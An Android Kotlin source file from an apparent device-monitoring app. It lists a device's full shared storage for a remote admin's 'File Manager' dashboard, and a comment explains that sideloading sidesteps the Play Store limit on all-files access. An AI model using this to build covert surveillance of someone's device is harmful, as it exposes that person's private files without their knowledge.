package com.spapp.monitoring.collectors

import android.content.Context
import android.os.Environment
import com.spapp.monitoring.network.FileEntryDto
import java.io.File

/**
 * Lists files the admin can view via the dashboard's File Manager screen.
 *
 * Browses the device's full shared storage (Environment.getExternalStorageDirectory())
 * when MANAGE_EXTERNAL_STORAGE has been granted — see MainActivity's "Grant Full
 * File Access" button. This app is sideloaded (not distributed through Play
 * Store), so the Play Store policy that normally restricts this permission
 * to file-manager/antivirus-category apps does not block it here; the admin
 * explicitly asked for the full on-device file listing, not just this app's
 * own sandbox.
 *
 * Falls back to the app's own private internal storage (context.filesDir)
 * if full access hasn't been granted yet, so File Manager still returns
 * something rather than failing outright.
 */
class FileManagerCollector(private val context: Context) {

    fun hasFullAccess(): Boolean = Environment.isExternalStorageManager()

    private fun root(): File =
        if (hasFullAccess()) Environment.getExternalStorageDirectory() else context.filesDir

    fun listFiles(relativePath: String? = null): List<FileEntryDto> = try {
        // context.filesDir / getExternalStorageDirectory() can return a path
        // through a symlink while File.canonicalFile resolves to the real
        // path — canonicalize ONCE up front and reuse that same reference for
        // both the traversal check and relativeTo(), or the two diverge and
        // every "relative" path comes out as a garbled "../../../.." chain.
        // The whole function is wrapped — .canonicalFile can throw IOException
        // on some real-device storage states, and an uncaught exception here
        // previously crashed the entire SyncWorker run, leaving the command
        // stuck at "sent" forever (never acked, never failed).
        val root = root().canonicalFile
        val target = if (relativePath.isNullOrBlank()) root else File(root, relativePath)
        val safeTarget = target.canonicalFile

        if (!safeTarget.path.startsWith(root.path)) {
            emptyList() // path traversal guard
        } else if (!safeTarget.exists() || !safeTarget.isDirectory) {
            emptyList()
        } else {
            safeTarget.listFiles()?.mapNotNull { file ->
                // A handful of system dirs throw/return null on listFiles() due
                // to per-directory permission quirks on some OEM ROMs — skip
                // just that entry instead of failing the whole listing.
                try {
                    FileEntryDto(
                        name = file.name,
                        path = file.canonicalFile.relativeTo(root).path,
                        isDirectory = file.isDirectory,
                        sizeBytes = if (file.isFile) file.length() else null,
                        mimeType = if (file.isFile) guessMimeType(file.extension) else null
                    )
                } catch (e: Exception) {
                    null
                }
            }?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: emptyList()
        }
    } catch (e: Exception) {
        emptyList()
    }

    fun resolveFile(relativePath: String): File? = try {
        val root = root().canonicalFile
        val target = File(root, relativePath)
        val safeTarget = target.canonicalFile
        if (!safeTarget.path.startsWith(root.path)) null
        else if (safeTarget.isFile) safeTarget else null
    } catch (e: Exception) {
        null
    }

    private fun guessMimeType(extension: String): String? = when (extension.lowercase()) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "pdf" -> "application/pdf"
        "txt" -> "text/plain"
        "json" -> "application/json"
        "mp4" -> "video/mp4"
        "mp3" -> "audio/mpeg"
        "doc", "docx" -> "application/msword"
        "apk" -> "application/vnd.android.package-archive"
        else -> null
    }
}
